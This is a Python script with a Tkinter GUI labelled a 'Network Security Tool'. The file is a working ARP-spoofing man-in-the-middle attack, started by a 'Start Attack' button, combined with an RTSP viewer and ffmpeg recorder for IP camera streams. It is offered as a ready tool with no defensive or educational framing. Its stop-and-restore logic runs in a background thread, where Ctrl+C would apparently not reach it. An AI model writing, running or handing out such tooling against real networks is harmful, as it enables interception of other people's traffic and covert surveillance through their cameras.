import os
import time
import subprocess
import tkinter as tk
from tkinter import messagebox
from scapy.all import *
import cv2
import threading
import psutil

# MitM ARP Spoofing Functions
def get_mac(ip, iface):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=5, iface=iface, verbose=False)[0]
    return answered_list[0][1].hwsrc

def restore(destination_ip, source_ip, iface):
    destination_mac = get_mac(destination_ip, iface)
    source_mac = get_mac(source_ip, iface)
    arp_response = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(arp_response, count=4, iface=iface, verbose=False)

def start_attack(attacker_ip, target_ip, spoof_ip, iface):
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    arp_target = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    arp_spoof = ARP(op=2, pdst=spoof_ip, psrc=target_ip)

    try:
        print("[*] Starting ARP spoofing... Press Ctrl+C to stop.")
        while True:
            send(arp_target, iface=iface, verbose=False)
            send(arp_spoof, iface=iface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Detected Ctrl+C ... Stopping ARP spoofing.")
        restore(target_ip, spoof_ip, iface)
        restore(spoof_ip, target_ip, iface)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[*] ARP spoofing stopped.")

def on_start_mitm():
    target_ip = target_ip_entry.get()
    spoof_ip = ip_to_spoof_entry.get()
    iface = iface_var.get()

    if not target_ip or not spoof_ip or not iface:
        messagebox.showwarning("Input Error", "Please enter all fields.")
        return

    messagebox.showinfo("Attack Started", "Press OK to start the attack. Use Ctrl+C in the console to stop.")
    run_thread(lambda: start_attack(None, target_ip, spoof_ip, iface))

# RTSP Stream Functions
def start_stream():
    username = username_entry.get()
    password = password_entry.get()
    ip_address = ip_entry.get()
    
    if not username or not password or not ip_address:
        messagebox.showwarning("Input Error", "Please enter all fields.")
        return

    rtsp_url = f"rtsp://{username}:{password}@{ip_address}:554/videoMain"
    cap = cv2.VideoCapture(rtsp_url)

    if not cap.isOpened():
        messagebox.showerror("Connection Error", "Failed to connect to the RTSP stream. Check your credentials and IP address.")
        return
    
    messagebox.showinfo("Stream Started", "Press OK to view the stream. Close the video window to stop.")
    
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        cv2.imshow('RTSP Stream', frame)
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
    
    cap.release()
    cv2.destroyAllWindows()

def start_download():
    username = username_entry.get()
    password = password_entry.get()
    ip_address = ip_entry.get()
    
    if not username or not password or not ip_address:
        messagebox.showwarning("Input Error", "Please enter all fields.")
        return

    rtsp_url = f"rtsp://{username}:{password}@{ip_address}:554/videoMain"
    output_file = "output_%Y%m%d_%H%M%S.mp4"

    command = [
        'ffmpeg',
        '-rtsp_transport', 'tcp',
        '-i', rtsp_url,
        '-c:v', 'copy',
        '-c:a', 'aac',
        '-b:a', '128k',
        '-f', 'segment',
        '-segment_time', '3600',
        '-reset_timestamps', '1',
        '-strftime', '1',
        output_file
    ]

    try:
        subprocess.run(command, check=True)
        messagebox.showinfo("Download Started", f"Stream is being recorded to {output_file}")
    except subprocess.CalledProcessError as e:
        messagebox.showerror("Download Error", f"An error occurred: {e}")

# Create a separate thread to run the functions
def run_thread(target):
    thread = threading.Thread(target=target)
    thread.start()

def list_interfaces():
    interfaces = psutil.net_if_addrs().keys()
    return interfaces

# Set up GUI
root = tk.Tk()
root.title("Network Security Tool")

# MitM ARP Spoofing Section
tk.Label(root, text="MitM ARP Spoofing", font=('Helvetica', 14, 'bold')).grid(row=0, columnspan=2, pady=10)

tk.Label(root, text="Target IP:").grid(row=1, column=0, padx=10, pady=10)
target_ip_entry = tk.Entry(root)
target_ip_entry.grid(row=1, column=1, padx=10, pady=10)

tk.Label(root, text="IP to Spoof:").grid(row=2, column=0, padx=10, pady=10)
ip_to_spoof_entry = tk.Entry(root)
ip_to_spoof_entry.grid(row=2, column=1, padx=10, pady=10)

tk.Label(root, text="Network Interface:").grid(row=3, column=0, padx=10, pady=10)
iface_var = tk.StringVar(root)
iface_menu = tk.OptionMenu(root, iface_var, *list_interfaces())
iface_menu.grid(row=3, column=1, padx=10, pady=10)

start_mitm_button = tk.Button(root, text="Start Attack", command=on_start_mitm)
start_mitm_button.grid(row=4, columnspan=2, pady=20)

# RTSP Stream Section
tk.Label(root, text="RTSP Stream Viewer and Downloader", font=('Helvetica', 14, 'bold')).grid(row=5, columnspan=2, pady=10)

tk.Label(root, text="Username:").grid(row=6, column=0, padx=10, pady=10)
username_entry = tk.Entry(root)
username_entry.grid(row=6, column=1, padx=10, pady=10)

tk.Label(root, text="Password:").grid(row=7, column=0, padx=10, pady=10)
password_entry = tk.Entry(root, show="*")
password_entry.grid(row=7, column=1, padx=10, pady=10)

tk.Label(root, text="Camera IP:").grid(row=8, column=0, padx=10, pady=10)
ip_entry = tk.Entry(root)
ip_entry.grid(row=8, column=1, padx=10, pady=10)

stream_button = tk.Button(root, text="Start Stream", command=lambda: run_thread(start_stream))
stream_button.grid(row=9, column=0, pady=20)

download_button = tk.Button(root, text="Start Download", command=lambda: run_thread(start_download))
download_button.grid(row=9, column=1, pady=20)

root.mainloop()
